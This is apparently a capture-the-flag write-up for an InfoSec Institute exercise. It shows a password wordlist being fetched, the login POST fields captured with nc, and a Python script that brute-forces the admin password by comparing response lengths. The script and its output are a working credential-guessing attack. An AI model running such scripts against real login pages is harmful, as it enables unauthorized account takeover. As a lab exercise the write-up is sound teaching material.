# Dictionary Attack

1.	As first step, let's try to find a password list as suggested
	(`filetype:lst password`)

		https://www.google.com/search?q=filetype%3Alst+password&ie=utf-8&oe=utf-8

	The first result is a wordlist from `nmap` SVN website. It should be ok.

		$ wget https://svn.nmap.org/nmap/nselib/data/passwords.lst

	Well. We'll use it later..

2.	Since this is a dictionary attack, our goal is to try all the passwords
	contained in the wordlist that we just downloaded. To perform this task we
	could use the "Intruder" from Burp Suite or write a simple Python script.
	We'll follow the second approach...

3.	As first thing, we need to know what data is posted. By using a local proxy
	(I'm using `nc`), posted data seems to be the following

		$ nc -l 9999
		POST http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php HTTP/1.1
		Host: ctf.infosecinstitute.com
		User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
		Accept-Language: en-GB,en;q=0.5
		Accept-Encoding: gzip, deflate
		DNT: 1
		Referer: http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php

		Connection: keep-alive
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 42

		username=admin&password=secret&logIn=Login

	Take a note...

4.	Remove from `passwords.lst` all the lines starting with

		#!comment:

4.	Put the following lines in a `.py` file (e.g. `ex12.py`)

		import requests

		TARGET = "http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php"

		with open('passwords.lst') as f:
			passwords = f.readlines()
		f.close()

		for p in passwords:
			pwd = p[:-1]
			s = requests.Session()
			# username=admin&password=secret&logIn=Login
			data = {'username': 'admin', 'password': pwd, 'logIn': 'Login'}
			r = s.post(TARGET, data=data)
			print "admin|%16s|%d" % (pwd, len(r.text))

5.	Run the script. It will print out, for each attempt, the tuple

		username|used password|response's length

	As we can see in the following, `princess` password generates a response
	that is less then others

		$ python ex12.py
		admin|          123456|4880
		admin|           12345|4880
		admin|       123456789|4880
		admin|        password|4880
		admin|        iloveyou|4880
		admin|        princess|4731 <-- !!!
		admin|        12345678|4880
		admin|         1234567|4880
		admin|          abc123|4880
		admin|          nicole|4880
		admin|          daniel|4880
		[...]

6.	Try to use `admin` and `princess` as credentials... ;-)
